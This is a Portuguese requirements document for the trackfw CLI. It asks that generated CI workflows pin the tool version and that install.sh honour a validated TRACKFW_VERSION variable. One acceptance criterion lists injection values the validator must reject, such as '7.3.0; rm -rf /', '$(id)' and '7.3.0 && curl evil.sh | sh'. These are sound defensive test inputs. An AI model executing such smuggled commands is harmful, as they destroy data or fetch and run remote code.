---
status: Done
date: 2026-08-28
author: "trackfw_architect (Zeus)"
adr: "docs/adr/ADR-2026-08-28-gate-de-ci-gerado-nasce-pinado-na-versao-que-o-gerou-e-o-install-sh-honra-trackfw-version.md"
roadmap: "docs/roadmaps/done/ROADMAP-2026-08-28-gate-de-ci-pinado-na-versao-geradora-e-install-sh-honrando-trackfw-version.md"
---

# REQ: Gate de CI gerado instala versão não pinada do trackfw e não há como pinar

> Date: 2026-08-28 | Status: Open

## Motivation

O workflow que o `trackfw init` gera instala a ferramenta com
`curl -sSfL .../releases/latest/download/install.sh | sh`, e `scripts/install.sh:33-44` resolve a
versão via `api.github.com/.../releases/latest`, **ignorando de qual tag o script foi baixado**.
Não existe env var, argumento nem flag que aceite uma versão: **ninguém consegue pinar**, nem
sabendo do problema.

Consequência: `trackfw validate` é bloqueante de PR, então uma release nova com regra mais estrita
reprova PRs sem que nada no repositório tenha mudado. O artefato que deveria dar reprodutibilidade
à entrega é o ponto não reprodutível.

Já cobrou preço: em 2026-08-27, no cmdb, um `trackfw update` reescreveu o workflow e apagou o pin
`TRACKFW_VERSION: "7.0.0"`, o `timeout-minutes: 10` e o comentário do ML-0D. O usuário havia
resolvido saindo do caminho suportado — tarball direto, escrito à mão. O defeito não é o `update`
sobrescrever (`ADR-2026-08-27` decidiu que propriedade é pelo caminho e customização não é
suportada); é o **asset gerado estar errado**, obrigando à customização.

## Acceptance Criteria

- [ ] **AC1** — `scripts/install.sh` instala a versão de `TRACKFW_VERSION` quando ela está definida
      e não vazia. Verificável: `TRACKFW_VERSION=7.2.0 sh install.sh` instala 7.2.0 com a release
      corrente sendo maior.
- [ ] **AC2** — Com `TRACKFW_VERSION` ausente **ou vazia**, o script resolve a release mais recente
      exatamente como hoje. Comportamento padrão inalterado.
- [ ] **AC3** — O valor é validado contra `^v?[0-9]+\.[0-9]+\.[0-9]+$` **antes** de compor qualquer
      URL ou invocar `curl`/`wget`. Valor inválido aborta com exit code não-zero e mensagem que
      nomeia a variável e o formato esperado.
- [ ] **AC4** — A validação de AC3 rejeita, com teste explícito para cada um:
      `7.3.0; rm -rf /`, `../../etc`, `$(id)`, `7.3.0 && curl evil.sh | sh`, `v7.3.0\nFOO`, e
      string vazia com só espaços. Nenhum deles pode chegar a compor URL.
- [ ] **AC5** — `TRACKFW_VERSION` aceita tanto `7.3.0` quanto `v7.3.0`; ambos baixam o mesmo asset.
- [ ] **AC6** — O template de GitHub Actions gerado contém `TRACKFW_VERSION: "<versão do binário>"`
      no bloco `env:` do job e `timeout-minutes: 10`. Verificável nos 3 CLIs: gerar em sandbox e
      comparar a string com a versão que o binário reporta em `--version`.
- [ ] **AC7** — O template de GitLab CI gerado pina pelo mesmo mecanismo (`variables:` com
      `TRACKFW_VERSION`), nos 3 CLIs.
- [ ] **AC8** — Os 3 CLIs geram workflow **byte-idêntico** para a mesma versão. Gate de paridade
      falsificável cobre isso e falha se um dos três divergir.
- [ ] **AC9** — `trackfw update` num projeto com workflow pinado numa versão antiga reescreve o pin
      para a versão do binário e reporta o alvo como `updated`, **nos 3 CLIs**. O Python passa a
      declarar `ci-workflow` em `PROJECT_TARGET_IDS` na mesma posição de Go e Node.
- [ ] **AC16** — A seção "CI workflow exclusion — Python (principled)" de `docs/cli-parity.md` é
      **apagada**, e a tabela "Cobertura por runtime" passa a marcar `sim` para os 3 CLIs nas linhas
      `.github/workflows/trackfw-gate.yml` e `.gitlab-ci-trackfw.yml`. A anotação
      `partial=exclusão de CI workflow no Python…` do contrato deixa de existir.
- [ ] **AC10** — `trackfw doctor` num projeto cujo workflow está pinado em versão diferente da do
      binário reporta `[scaffold-divergent]` com remédio `trackfw update`, nos 3 CLIs.
- [ ] **AC11** — `trackfw doctor` num projeto recém-gerado pelo mesmo binário reporta
      `no mismatches` — o pin não pode gerar divergência contra si mesmo.
- [ ] **AC12** — Os doc-comments que declaram o builder cfg-independente são corrigidos: continuam
      cfg-independentes, deixaram de ser version-independentes. Localização **medida** pela Wave 0:
      `internal/generators/scaffold.go:1906` (`buildGitHubActionsWorkflowContent`) e `:1931`
      (`buildGitLabCIWorkflowContent`), mais os equivalentes Node/Python. **Não é**
      `scaffold_doctor.go:62` — aquele é um comentário de desenho sobre propriedade-por-caminho, sem
      menção a cfg-independence; a referência original desta REQ estava errada.
- [ ] **AC13** — As ocorrências da linha não pinada em textos gerados de CLAUDE.md/docs
      (`npm/src/generators/init.js`, `pypi/trackfw/generators/init_gen.py`) são atualizadas ou
      explicitamente declaradas fora do pin, sem sobrar instrução contraditória em nenhum dos 3.
- [ ] **AC14** — `docs/cli-parity.md` tem seção anotada com `gate=` para o contrato do pin;
      `scripts/check-parity-contract-coverage.sh` continua verde.
- [ ] **AC15** — `TRACKFW_DISABLE_EXTERNAL_COMMANDS=1 make quality` → exit 0.
- [ ] **AC17** — O remédio impresso pelo `doctor` para `.github/workflows/trackfw-validate.yml` não
      pode ser inerte. Hoje ele imprime `trackfw update`, e nenhum alvo de `update` nos 3 CLIs toca
      nesse arquivo. O alvo `ci-workflow` passa a gerenciá-lo também, nos 3, com estas regras:
      (a) o arquivo é **refrescado quando já existe** em disco, e a existência — não `cfg.ci` — é o
      critério, porque quem o escreve é o `discover`, pelo sinal de descoberta, e é o mesmo critério
      que o `doctor` já usa desde o ML-2F;
      (b) o `update` **nunca cria** esse arquivo em projeto que não o tem;
      (c) o alvo passa a ser incluído quando `cfg.ci` é `github-actions`/`gitlab-ci` **ou** quando o
      `trackfw-validate.yml` existe — senão um projeto com `ci: none` que rodou `discover` ficaria
      com o arquivo fora de qualquer gestão, que é o buraco que este AC fecha;
      (d) idempotência: `update` duas vezes com o mesmo binário não reporta `updated` na segunda.

## Emenda de 2026-08-28 (pós-Wave 0)

Esta REQ nasceu supondo que o CLI Python **gerava** o workflow de CI e apenas não o atualizava.
Medição posterior do arquiteto: o Python **nunca gerou workflow nenhum** — não há `--ci` no
`init.py`, não há gerador em `pypi/trackfw/generators/`, e as 2 ocorrências de `releases/latest` em
`init_gen.py` são texto de ajuda. Por decisão de KG (regra dura de paridade dos 3 CLIs), o escopo
passou a incluir **fechar** a lacuna: gerar, gerenciar no `update` e cobrir no `doctor` — daí AC9
reescrito e AC16 novo. O residual do ML-0A que afirma que o Python "pina uma vez e nunca mais
bumpa" descende da premissa antiga e está marcado como incorreto no roadmap.

## Negative Scope

Explicitamente **fora** desta REQ:

- **Não** registrar `.github/workflows/` no `integrations-manifest.json`. `ADR-2026-08-27` fica
  inteiro de pé: propriedade pelo caminho, sem migração.
- **Não** fazer o `update` recusar sobrescrever workflow divergente, nem adicionar `--force` a ele.
  Sobrescrever é o comportamento desenhado; a correção é o template nascer certo.
- **Não** dar ao `init` do CLI Python as flags `--ci` e `--hooks`, nem declarar `git-hooks` como
  alvo dele. Isso é
  `REQ-2026-08-28-cli-python-nao-oferece-superficie-de-ci-e-git-hooks-no-init-e-nao-declara-git-hooks-como-alvo-do-update.md`,
  que depende desta. Aqui o Python passa a **gerenciar** o workflow de um projeto cujo
  `trackfw.yaml` já declara `ci:`; **escolher** o CI na criação continua fora.
- **Não** aceitar versão por argumento posicional ou flag no `install.sh` — apenas env var.
- **Não** tocar em `.github/workflows/` deste repositório (os workflows do próprio trackfw são
  mantidos à mão e não são gerados pelo scaffold).
- **Não** corrigir os artefatos do projeto cmdb. É outro repositório, outra sessão.
- **Não** resolver os resíduos de backlog (`package-lock.json` em 6.1.0, sanitização de valor do
  `agent_models`, mensagens de `~usuario/`, teste do guard de Windows em Node/Python,
  `discover.go` sem `Chmod`).

## Linked ADR
ADR: ADR-2026-08-28-gate-de-ci-gerado-nasce-pinado-na-versao-que-o-gerou-e-o-install-sh-honra-trackfw-version.md

## Blocked by ADRs
<!-- none -->

## Linked Roadmap
Roadmap: docs/roadmaps/done/ROADMAP-2026-08-28-gate-de-ci-pinado-na-versao-geradora-e-install-sh-honrando-trackfw-version.md
